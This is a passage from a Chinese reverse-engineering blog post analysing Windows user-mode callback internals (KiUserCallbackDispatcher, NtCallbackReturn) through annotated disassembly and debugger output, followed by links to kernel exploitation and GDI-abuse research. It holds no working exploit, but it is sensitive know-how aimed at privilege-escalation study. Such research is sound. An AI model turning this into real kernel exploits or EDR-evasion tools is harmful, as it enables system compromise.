ecx</span><br><span class="line">.text:<span class="number">6</span>A292687 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">6</span>A292687</span><br><span class="line">.text:<span class="number">6</span>A292687 loc_6A292687:                           <span class="comment">// CODE XREF: KiUserCallbackDispatcher(x,x,x)+7↑j</span></span><br><span class="line">.text:<span class="number">6</span>A292687                 mov     ecx, large fs:_TEB</span><br><span class="line">.text:<span class="number">6</span>A29268E                 mov     edx, offset _KiUserCallbackExceptionHandler@<span class="number">16</span> <span class="comment">// KiUserCallbackExceptionHandler(x,x,x,x)</span></span><br><span class="line">.text:<span class="number">6</span>A292693                 lea     eax, [esp+arg_ExceptionList]</span><br><span class="line">.text:<span class="number">6</span>A292697                 mov     [esp+arg_ExceptionList], ecx <span class="comment">// 先将 3 环的异常链条保存起来</span></span><br><span class="line">.text:<span class="number">6</span>A29269B                 mov     [esp+arg_10], edx</span><br><span class="line">.text:<span class="number">6</span>A29269F                 mov     large fs:<span class="number">0</span>, eax <span class="comment">// 然后又将 3 环的异常链条写回去</span></span><br><span class="line">.text:<span class="number">6</span>A2926A5                 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">6</span>A2926A8                 pop     edx             <span class="comment">// edi = ApiNumber</span></span><br><span class="line">.text:<span class="number">6</span>A2926A9                 mov     eax, large fs:_TEB.ProcessEnvironmentBlock <span class="comment">// eax = PEB</span></span><br><span class="line">.text:<span class="number">6</span>A2926AF                 mov     eax, [eax+_PEB.___u14.KernelCallbackTable]</span><br><span class="line">.text:<span class="number">6</span>A2926B2                 mov     ecx, [eax+edx*<span class="number">4</span>] <span class="comment">// ecx 为 3 环回调函数地址</span></span><br><span class="line">.text:<span class="number">6</span>A2926B5                 call    ds:___guard_check_icall_fptr <span class="comment">// RtlpHpAppCompatDontChangePolicy()</span></span><br><span class="line">.text:<span class="number">6</span>A2926BB                 call    ecx</span><br><span class="line">.text:<span class="number">6</span>A2926BD                 push    eax</span><br><span class="line">.text:<span class="number">6</span>A2926BE                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">6</span>A2926C0                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">6</span>A2926C2                 call    _ZwCallbackReturn@<span class="number">12</span> <span class="comment">// NTSTATUS NTAPI ZwCallbackReturn(</span></span><br><span class="line">.text:<span class="number">6</span>A2926C2                                         <span class="comment">//     _In_ PVOID Result,</span></span><br><span class="line">.text:<span class="number">6</span>A2926C2                                         <span class="comment">//     _In_ ULONG ResultLength,</span></span><br><span class="line">.text:<span class="number">6</span>A2926C2                                         <span class="comment">//     _In_ NTSTATUS Status</span></span><br><span class="line">.text:<span class="number">6</span>A2926C2                                         <span class="comment">// )//</span></span><br><span class="line">.text:<span class="number">6</span>A2926C7                 mov     esi, eax</span><br><span class="line">.text:<span class="number">6</span>A2926C9</span><br><span class="line">.text:<span class="number">6</span>A2926C9 loc_6A2926C9:                           <span class="comment">// CODE XREF: .text:6A2926CF↓j</span></span><br><span class="line">.text:<span class="number">6</span>A2926C9                 push    esi</span><br><span class="line">.text:<span class="number">6</span>A2926CA                 call    _RtlRaiseStatus@<span class="number">4</span> <span class="comment">// RtlRaiseStatus(x)</span></span><br><span class="line">.text:<span class="number">6</span>A2926CA _KiUserCallbackDispatcher@<span class="number">12</span> endp <span class="comment">// sp-analysis failed</span></span><br></pre></td></tr></table></figure>



<p>函数堆栈情况如下：</p>
<p><img data-src="https://s2.loli.net/2022/10/18/ys8UjmzEFNYCoSv.png" alt="36.png"></p>
<h3 id="4-6-ZwCallbackReturn"><a href="#4-6-ZwCallbackReturn" class="headerlink" title="4.6 ZwCallbackReturn"></a>4.6 ZwCallbackReturn</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">6</span>A291900 <span class="comment">// __stdcall ZwCallbackReturn(x, x, x)</span></span><br><span class="line">.text:<span class="number">6</span>A291900                 <span class="keyword">public</span> _ZwCallbackReturn@<span class="number">12</span></span><br><span class="line">.text:<span class="number">6</span>A291900 _ZwCallbackReturn@<span class="number">12</span> proc near          <span class="comment">// CODE XREF: KiUserCallbackExceptionHandler(x,x,x,x)+13↓p</span></span><br><span class="line">.text:<span class="number">6</span>A291900                                         <span class="comment">// KiUserCallbackDispatcher(x,x,x)+52↓p</span></span><br><span class="line">.text:<span class="number">6</span>A291900                                         <span class="comment">// DATA XREF: ...</span></span><br><span class="line">.text:<span class="number">6</span>A291900                 mov     eax, <span class="number">196</span>h       <span class="comment">// NtCallbackReturn</span></span><br><span class="line">.text:<span class="number">6</span>A291905                 call    sub_6A29190D</span><br><span class="line">.text:<span class="number">6</span>A29190A                 retn    <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">6</span>A29190A _ZwCallbackReturn@<span class="number">12</span> endp</span><br></pre></td></tr></table></figure>



<p><strong>SSDT</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd KeServiceDescriptorTable</span><br><span class="line"><span class="number">81721540</span>  <span class="number">81595</span>ab8 <span class="number">00000000</span> <span class="number">000001</span>d7 <span class="number">81596218</span></span><br><span class="line"><span class="number">81721550</span>  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"></span><br><span class="line">kd&gt; dds <span class="number">81595</span>ab8+<span class="number">0x196</span>*<span class="number">4</span></span><br><span class="line">ReadVirtual: <span class="number">81596110</span> <span class="keyword">not</span> properly sign extended</span><br><span class="line"><span class="number">81596110</span>  <span class="number">815959</span>cc nt!NtCallbackReturn</span><br><span class="line"><span class="number">81596114</span>  <span class="number">814</span>c6510 nt!NtAssociateWaitCompletionPacket</span><br><span class="line"><span class="number">81596118</span>  <span class="number">817f</span>ab22 nt!NtAssignProcessToJobObject</span><br><span class="line"><span class="number">8159611</span>c  <span class="number">8185e392</span> nt!NtAreMappedFilesTheSame</span><br><span class="line"><span class="number">81596120</span>  <span class="number">817</span>a5e9c nt!NtApphelpCacheControl</span><br><span class="line"><span class="number">81596124</span>  <span class="number">81823f</span>70 nt!NtAlpcSetInformation</span><br><span class="line"><span class="number">81596128</span>  <span class="number">8179f</span>7c0 nt!NtAlpcSendWaitReceivePort</span><br></pre></td></tr></table></figure>





<h3 id="4-7-NtCallbackReturn"><a href="#4-7-NtCallbackReturn" class="headerlink" title="4.7 NtCallbackReturn"></a>4.7 NtCallbackReturn</h3><p>该函数需要注意以下几点：</p>
<ol>
<li><p><code>KTHREAD.InitialStack</code> 如下图（在 <code>KiCalluserMode</code> 中更新填充）：</p>
<p><img data-src="https://s2.loli.net/2022/10/17/xUqdV7wbM2ejEsB.png" alt="35.png"></p>
</li>
<li><p>上图中的 <code>ESP0</code> 的位置如下：</p>
<p><img data-src="https://s2.loli.net/2022/10/18/NK7PhSsmqVbt12j.png" alt="37.png"></p>
<p>这个 <code>ESP0</code>是在函数 <code>KiCallUserMode</code> 中压入的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0057</span>D770                 mov     ecx, [esp+<span class="number">10</span>h+arg_pPreviousThreadStackInfo]</span><br><span class="line">.text:<span class="number">0057</span>D774                 mov     [ecx+<span class="number">18</span>h], esp  <span class="comment">// ecx指向KSTACK_CONTROL结构</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>更新 <code>ESP0</code>：在如下为只更新的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0057</span>DA1B                 lea     esp, [ecx+<span class="number">10</span>h]  <span class="comment">// 此处存放CurrentThread.StackBase</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>返回：根据步骤2，里面的返回地址是在 <code>KeUserModeCallback</code> 函数中。</p>
</li>
</ol>
<p>函数分析：</p>
<p><img data-src="https://s2.loli.net/2022/10/18/93luQyKFrRcxiz1.png" alt="39.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0057</span>D9CC <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:<span class="number">0057</span>D9CC</span><br><span class="line">.text:<span class="number">0057</span>D9CC</span><br><span class="line">.text:<span class="number">0057</span>D9CC <span class="comment">// NTSTATUS __stdcall NtCallbackReturn(PVOID Result, ULONG ResultLength, NTSTATUS Status)</span></span><br><span class="line">.text:<span class="number">0057</span>D9CC _NtCallbackReturn@<span class="number">12</span> proc near          <span class="comment">// CODE XREF: sub_595471+4B↓p</span></span><br><span class="line">.text:<span class="number">0057</span>D9CC                                         <span class="comment">// DATA XREF: .text:0057E110↓o</span></span><br><span class="line">.text:<span class="number">0057</span>D9CC</span><br><span class="line">.text:<span class="number">0057</span>D9CC Result          = dword ptr  <span class="number">4</span></span><br><span class="line">.text:<span class="number">0057</span>D9CC ResultLength    = dword ptr  <span class="number">8</span></span><br><span class="line">.text:<span class="number">0057</span>D9CC Status          = dword ptr  <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">0057</span>D9CC</span><br><span class="line">.text:<span class="number">0057</span>D9CC                 mov     eax, large fs:_KPCR.PrcbData.CurrentThread</span><br><span class="line">.text:<span class="number">0057</span>D9D2                 mov     ecx, [eax+_KTHREAD.InitialStack] <span class="comment">// 此时InitialStack指向KSTACK_CONTROL</span></span><br><span class="line">.text:<span class="number">0057</span>D9D5                 mov     edx, [ecx+<span class="number">18</span>h]  <span class="comment">// edx 指向原先的ESP0，此时的esp0为刚进入KiCallUserMode函数时</span></span><br><span class="line">.text:<span class="number">0057</span>D9D8                 test    edx, edx</span><br><span class="line">.text:<span class="number">0057</span>D9DA                 jz      loc_57DAAE      <span class="comment">// return STATUS_NO_CALLBACK_ACTIVE</span></span><br><span class="line">.text:<span class="number">0057</span>D9E0                 mov     ebx, eax        <span class="comment">// ebx = KTHREAD</span></span><br><span class="line">.text:<span class="number">0057</span>D9E2                 mov     esi, [esp+Result]</span><br><span class="line">.text:<span class="number">0057</span>D9E6                 mov     edi, [esp+ResultLength]</span><br><span class="line">.text:<span class="number">0057</span>D9EA                 mov     ebp, [edx+<span class="number">14</span>h]  <span class="comment">// ====================================================</span></span><br><span class="line">.text:<span class="number">0057</span>D9EA                                         <span class="comment">// edx 指向原先的ESP0，此时的esp0为刚进入KiCallUserMode函数时</span></span><br><span class="line">.text:<span class="number">0057</span>D9EA                                         <span class="comment">// 则此时 esp0+0x14 应该为KiCallUserMode的参数OutputBuffer</span></span><br><span class="line">.text:<span class="number">0057</span>D9EA                                         <span class="comment">// ====================================================</span></span><br><span class="line">.text:<span class="number">0057</span>D9ED                 mov     eax, [edx+<span class="number">18</span>h]</span><br><span class="line">.text:<span class="number">0057</span>D9F0                 mov     [ebp+<span class="number">0</span>], esi</span><br><span class="line">.text:<span class="number">0057</span>D9F3                 mov     [eax], edi      <span class="comment">// edx+18h为KiCallUserMode的参数OutputLength</span></span><br><span class="line">.text:<span class="number">0057</span>D9F5                 mov     ebp, [ebx+_KTHREAD.TrapFrame]</span><br><span class="line">.text:<span class="number">0057</span>D9F8                 mov     eax, [ecx+<span class="number">0</span>Ch]  <span class="comment">// ExceptionList(FS:[0])</span></span><br><span class="line">.text:<span class="number">0057</span>D9FB                 mov     large fs:<span class="number">0</span>, eax</span><br><span class="line">.text:<span class="number">0057</span>DA01                 mov     ebp, [esp+Status]</span><br><span class="line">.text:<span class="number">0057</span>DA05                 mov     edi, [ecx+<span class="number">8</span>]    <span class="comment">// 原先的 TrapFrame</span></span><br><span class="line">.text:<span class="number">0057</span>DA08                 cmp     ebp, <span class="number">0</span>C0000423h <span class="comment">// STATUS_CALLBACK_POP_STACK（A user mode unwind is in progress.）</span></span><br><span class="line">.text:<span class="number">0057</span>DA08                                         <span class="comment">// 用户模式正在展开中。</span></span><br><span class="line">.text:<span class="number">0057</span>DA0E                 cli</span><br><span class="line">.text:<span class="number">0057</span>DA0F                 jz      <span class="keyword">short</span> loc_57DA60</span><br><span class="line">.text:<span class="number">0057</span>DA11</span><br><span class="line">.text:<span class="number">0057</span>DA11 loc_57DA11:                             <span class="comment">// CODE XREF: NtCallbackReturn(x,x,x)+B4↓j</span></span><br><span class="line">.text:<span class="number">0057</span>DA11                 <span class="keyword">and</span>     [edi+_KTRAP_FRAME.Dr7], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0057</span>DA15                 test    [ebx+_KTHREAD.Header.___u0.__s6.DebugActive], <span class="number">0</span>DFh</span><br><span class="line">.text:<span class="number">0057</span>DA19                 jnz     <span class="keyword">short</span> loc_57DA82 <span class="comment">// 处理调试寄存器DRx</span></span><br><span class="line">.text:<span class="number">0057</span>DA1B</span><br><span class="line">.text:<span class="number">0057</span>DA1B loc_57DA1B:                             <span class="comment">// CODE XREF: NtCallbackReturn(x,x,x)+DD↓j</span></span><br><span class="line">.text:<span class="number">0057</span>DA1B                 lea     esp, [ecx+<span class="number">10</span>h]  <span class="comment">// 此处存放CurrentThread.StackBase</span></span><br><span class="line">.text:<span class="number">0057</span>DA1E                 test    byte ptr [edi+(_KTRAP_FRAME.EFlags+<span class="number">2</span>)], <span class="number">2</span> <span class="comment">// v86</span></span><br><span class="line">.text:<span class="number">0057</span>DA22                 lea     eax, [edi+<span class="number">8</span>Ch]  <span class="comment">// eax 指向 TrapFrame 最高的位置</span></span><br><span class="line">.text:<span class="number">0057</span>DA22                                         <span class="comment">// 因为 TrapFrame 总共大小 0x8c</span></span><br><span class="line">.text:<span class="number">0057</span>DA28                 jnz     <span class="keyword">short</span> loc_57DA2D</span><br><span class="line">.text:<span class="number">0057</span>DA2A                 sub     eax, <span class="number">10</span>h        <span class="comment">// 此时 eax 指向 TrapFrame.v86Es</span></span><br><span class="line">.text:<span class="number">0057</span>DA2D</span><br><span class="line">.text:<span class="number">0057</span>DA2D loc_57DA2D:                             <span class="comment">// CODE XREF: NtCallbackReturn(x,x,x)+5C↑j</span></span><br><span class="line">.text:<span class="number">0057</span>DA2D                 test    ss:_KiKvaShadow, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0057</span>DA35                 mov     large fs:_KPCR.PrcbData.EspBaseShadow, eax <span class="comment">// =================================</span></span><br><span class="line">.text:<span class="number">0057</span>DA35                                         <span class="comment">// 这里比较有意思，这个位置有点像系统调用时候的 TSS.ESP0 位置</span></span><br><span class="line">.text:<span class="number">0057</span>DA35                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0057</span>DA35                                         <span class="comment">// v86模式：  EspBaseShadow 指向 TrapFrame.v86Gs+4</span></span><br><span class="line">.text:<span class="number">0057</span>DA35                                         <span class="comment">// 非v86模式：EspBaseShadow 指向 TrapFrame.v86Es == TrapFrame.Ss+4</span></span><br><span class="line">.text:<span class="number">0057</span>DA35                                         <span class="comment">// =============================================================</span></span><br><span class="line">.text:<span class="number">0057</span>DA3B                 jnz     <span class="keyword">short</span> loc_57DA47 <span class="comment">// 切换回之前进入 3 环前的 TrapFrame！！！！！！！！！</span></span><br><span class="line">.text:<span class="number">0057</span>DA3D                 mov     edx, large fs:_KPCR.___u0.NtTib.SubSystemTib</span><br><span class="line">.text:<span class="number">0057</span>DA44                 mov     [edx+_NT_TIB.StackBase], eax <span class="comment">// 更新栈底！！！！！！！！！！！！！</span></span><br><span class="line">.text:<span class="number">0057</span>DA44                                         <span class="comment">// 使其为 TrapFrame 中刚才选好的esp0的位置</span></span><br><span class="line">.text:<span class="number">0057</span>DA47</span><br><span class="line">.text:<span class="number">0057</span>DA47 loc_57DA47:                             <span class="comment">// CODE XREF: NtCallbackReturn(x,x,x)+6F↑j</span></span><br><span class="line">.text:<span class="number">0057</span>DA47                 mov     [ebx+_KTHREAD.TrapFrame], edi <span class="comment">// 切换回之前进入 3 环前的 TrapFrame！！！！！！！！！</span></span><br><span class="line">.text:<span class="number">0057</span>DA4A                 pop     [ebx+_KTHREAD.StackBase]</span><br><span class="line">.text:<span class="number">0057</span>DA4D                 pop     [ebx+_KTHREAD.StackLimit]</span><br><span class="line">.text:<span class="number">0057</span>DA50                 pop     edx</span><br><span class="line">.text:<span class="number">0057</span>DA51                 pop     [ebx+_KTHREAD.InitialStack]</span><br><span class="line">.text:<span class="number">0057</span>DA54                 mov     esp, edx</span><br><span class="line">.text:<span class="number">0057</span>DA56                 sti</span><br><span class="line">.text:<span class="number">0057</span>DA57                 mov     eax, ebp        <span class="comment">// Status</span></span><br><span class="line">.text:<span class="number">0057</span>DA59                 pop     edi</span><br><span class="line">.text:<span class="number">0057</span>DA5A                 pop     esi</span><br><span class="line">.text:<span class="number">0057</span>DA5B                 pop     ebx</span><br><span class="line">.text:<span class="number">0057</span>DA5C                 pop     ebp</span><br><span class="line">.text:<span class="number">0057</span>DA5D                 retn    <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0057</span>DA60 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0057</span>DA60</span><br><span class="line">.text:<span class="number">0057</span>DA60 loc_57DA60:                             <span class="comment">// CODE XREF: NtCallbackReturn(x,x,x)+43↑j</span></span><br><span class="line">.text:<span class="number">0057</span>DA60                 mov     ecx, <span class="number">0B</span>h</span><br><span class="line">.text:<span class="number">0057</span>DA65                 mov     esi, [ebx+<span class="number">6</span>Ch]</span><br><span class="line">.text:<span class="number">0057</span>DA68                 test    byte ptr [esi+<span class="number">72</span>h], <span class="number">2</span></span><br><span class="line">.text:<span class="number">0057</span>DA6C                 mov     edx, edi</span><br><span class="line">.text:<span class="number">0057</span>DA6E                 lea     edi, [edi+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">0057</span>DA71                 jz      <span class="keyword">short</span> loc_57DA76</span><br><span class="line">.text:<span class="number">0057</span>DA73                 add     ecx, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0057</span>DA76</span><br><span class="line">.text:<span class="number">0057</span>DA76 loc_57DA76:                             <span class="comment">// CODE XREF: NtCallbackReturn(x,x,x)+A5↑j</span></span><br><span class="line">.text:<span class="number">0057</span>DA76                 lea     esi, [esi+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">0057</span>DA79                 rep movsd</span><br><span class="line">.text:<span class="number">0057</span>DA7B                 mov     ecx, [ebx+<span class="number">20</span>h]</span><br><span class="line">.text:<span class="number">0057</span>DA7E                 mov     edi, edx</span><br><span class="line">.text:<span class="number">0057</span>DA80                 jmp     <span class="keyword">short</span> loc_57DA11</span><br><span class="line">.text:<span class="number">0057</span>DA82 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0057</span>DA82</span><br><span class="line">.text:<span class="number">0057</span>DA82 loc_57DA82:                             <span class="comment">// CODE XREF: NtCallbackReturn(x,x,x)+4D↑j</span></span><br><span class="line">.text:<span class="number">0057</span>DA82                 mov     esi, [ebx+_KTHREAD.TrapFrame]</span><br><span class="line">.text:<span class="number">0057</span>DA85                 mov     edx, [esi+_KTRAP_FRAME.Dr0]</span><br><span class="line">.text:<span class="number">0057</span>DA88                 mov     [edi+_KTRAP_FRAME.Dr0], edx</span><br><span class="line">.text:<span class="number">0057</span>DA8B                 mov     edx, [esi+_KTRAP_FRAME.Dr1]</span><br><span class="line">.text:<span class="number">0057</span>DA8E                 mov     [edi+_KTRAP_FRAME.Dr1], edx</span><br><span class="line">.text:<span class="number">0057</span>DA91                 mov     edx, [esi+_KTRAP_FRAME.Dr2]</span><br><span class="line">.text:<span class="number">0057</span>DA94                 mov     [edi+_KTRAP_FRAME.Dr2], edx</span><br><span class="line">.text:<span class="number">0057</span>DA97                 mov     edx, [esi+_KTRAP_FRAME.Dr3]</span><br><span class="line">.text:<span class="number">0057</span>DA9A                 mov     [edi+_KTRAP_FRAME.Dr3], edx</span><br><span class="line">.text:<span class="number">0057</span>DA9D                 mov     edx, [esi+_KTRAP_FRAME.Dr6]</span><br><span class="line">.text:<span class="number">0057</span>DAA0                 mov     [edi+_KTRAP_FRAME.Dr6], edx</span><br><span class="line">.text:<span class="number">0057</span>DAA3                 mov     edx, [esi+_KTRAP_FRAME.Dr7]</span><br><span class="line">.text:<span class="number">0057</span>DAA6                 mov     [edi+_KTRAP_FRAME.Dr7], edx</span><br><span class="line">.text:<span class="number">0057</span>DAA9                 jmp     loc_57DA1B      <span class="comment">// 此处存放CurrentThread.StackBase</span></span><br><span class="line">.text:<span class="number">0057</span>DAAE <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0057</span>DAAE</span><br><span class="line">.text:<span class="number">0057</span>DAAE loc_57DAAE:                             <span class="comment">// CODE XREF: NtCallbackReturn(x,x,x)+E↑j</span></span><br><span class="line">.text:<span class="number">0057</span>DAAE                 mov     eax, <span class="number">0</span>C0000258h <span class="comment">// return STATUS_NO_CALLBACK_ACTIVE</span></span><br><span class="line">.text:<span class="number">0057</span>DAB3                 retn    <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">0057</span>DAB3 _NtCallbackReturn@<span class="number">12</span> endp</span><br></pre></td></tr></table></figure>





<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/revercc/p/14656013.html">KeUserModeCallback函数</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/184233">KeUserModeCallback 过程详细分析</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-104918.htm">KeUserModeCallback用法详解-看雪</a></p>
<p><a target="_blank" rel="noopener" href="https://www.stormshield.com/news/how-to-run-userland-code-from-the-kernel-on-windows/">How to run userland code from the kernel on Windows</a></p>
<p><a target="_blank" rel="noopener" href="https://j00ru.vexillium.org/2010/09/kernel-exploitation-r0-to-r3-transitions-via-keusermodecallback/">Kernel exploitation – r0 to r3 transitions via KeUserModeCallback</a></p>
<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/72007033/how-to-monitor-kernel-callbacks">How to monitor Kernel callbacks</a></p>
<p><a target="_blank" rel="noopener" href="https://conference.hitb.org/hitbsecconf2018ams/materials/D2T2%20-%20Rancho%20Han%20-%20Pwning%20The%20Windows%20Kernel.pdf">Over the Edge Pwning the windows kernel</a></p>
<p><a target="_blank" rel="noopener" href="http://www.vxjump.net/files/security_research/win10_KeUserModeCallback.pdf">Win10下日落西山的 KeUserModeCallback攻击方式</a></p>
<p><a target="_blank" rel="noopener" href="http://hacky.ren/2022/04/23/%E7%BB%BF%E7%9B%9F%E7%A7%91%E6%8A%80-%E6%AF%8F%E5%91%A8%E8%93%9D%E5%86%9B%E6%8A%80%E6%9C%AF%E6%8E%A8%E9%80%81%EF%BC%882022.4.16-4.22%EF%BC%89/">绿盟科技-每周蓝军技术推送（2022.4.16-4.22）学习</a></p>
<p><a target="_blank" rel="noopener" href="https://dennisbabkin.com/blog/?t=depths-of-windows-apc-aspects-of-asynchronous-procedure-call-internals-from-kernel-mode">Aspects of internals of the Asynchronous Procedure Calls from the kernel mode.</a></p>
<p><a target="_blank" rel="noopener" href="https://www.matteomalvica.com/minutes/windows_kernel/">windows kernel internals</a></p>
<p><a target="_blank" rel="noopener" href="https://ti.qianxin.com/blog/articles/elevation-of-privilege-bug%20(CVE-2021-1732)-analysis/">【红雨滴沙箱支持提权漏洞利用检测】CVE-2021-1732 Microsoft Windows提权漏洞分析</a></p>
<p><a target="_blank" rel="noopener" href="https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/">Removing Kernel Callbacks Using Signed Drivers</a></p>
<p><a target="_blank" rel="noopener" href="https://pre.empt.dev/posts/maelstrom-edr-kernel-callbacks-hooks-and-callstacks/">Maelstrom: EDR Kernel Callbacks, Hooks, and Call Stacks</a></p>
<p><a target="_blank" rel="noopener" href="https://www.zybuluo.com/zoand/note/1392885">awesome-windows-kernel-security-development</a></p>
<h3 id="4-8-调用全景图"><a href="#4-8-调用全景图" class="headerlink" title="4.8 调用全景图"></a>4.8 调用全景图</h3><p><img data-src="https://s2.loli.net/2022/10/18/6McwEly7xYA9N4a.png" alt="38.png"></p>
<h2 id="5-后续工作"><a href="#5-后续工作" class="headerlink" title="5 后续工作"></a>5 后续工作</h2><ol>
<li>CreateWindowsEx 逆向分析。这是后续工作，参考海哥火哥视频。</li>
<li>以下 <a target="_blank" rel="noopener" href="https://fuzzysecurity.com/tutorials.html">19 种漏洞分析</a>。主要涉及 User-Mode CallBack, Kernel Leaks, tagWND …</li>
</ol>
<p><img data-src="https://s2.loli.net/2022/10/18/5hH8vwjNOB9Vc63.png" alt="40.png"></p>
<p>结合以下的一篇文章：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://xiaodaozhi.com/exploit/29.html">通过 Windows 用户模式回调实施的内核攻击</a></li>
<li><a target="_blank" rel="noopener" href="https://paper.bobylive.com/Meeting_Papers/BlackHat/USA-2011/BH_US_11_Mandt_win32k_Slides.pdf">Kernel Attacks through User Mode Callbacks-2011</a></li>
<li><a target="_blank" rel="noopener" href="https://downloads.volatilityfoundation.org/omfw/2012/OMFW2012_Ligh.pdf">OMFW-Malware in the Windows GUI Subsystem</a></li>
</ul>
<h2 id="6-GDI-对象分析"><a href="#6-GDI-对象分析" class="headerlink" title="6 GDI 对象分析"></a>6 GDI 对象分析</h2><p>这部分是后续工作。</p>
<p>GDI 对象滥用很重要，还涉及到内核信息泄露。（以下文章在 Safari <strong>Tab Space</strong> 插件下标签为 GDI Objects）</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://ryze-t.com/2021/11/23/GDI-%E5%AF%B9%E8%B1%A1%E5%88%A9%E7%94%A8/">GDI 对象利用</a></li>
<li>大部分文章都是参考这个报告——<a target="_blank" rel="noopener" href="https://conference.hitb.org/hitbsecconf2018ams/materials/D1%20COMMSEC%20-%20Saif%20Elsherei%20and%20Ian%20Kronquist%20-%20The%20Life%20&%20Death%20of%20Kernel%20Object%20Abuse.pdf">The Life And Death of Kernel Object Abuse</a></li>
<li><a target="_blank" rel="noopener" href="https://saturn35.com/2019/07/25/20190725-1/">滥用GDI对象</a></li>
<li><a href="">Windows GDI Bitmap</a></li>
<li><a target="_blank" rel="noopener" href="http://www.vxjump.net/files/seccon/exp-in-gdi.pdf">GDI魔术：漏洞利用中的利器</a></li>
<li><a target="_blank" rel="noopener" href="https://xiaodaozhi.com/exploit/42.html">从 CVE-2016-0165 说起：分析、利用和检测（中）</a></li>
<li><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-225436.htm">Bitmap轶事：Windows 10纪念版后的GDI对象泄露</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/156519">Windows特权提升：GDI Bitmap滥用</a></li>
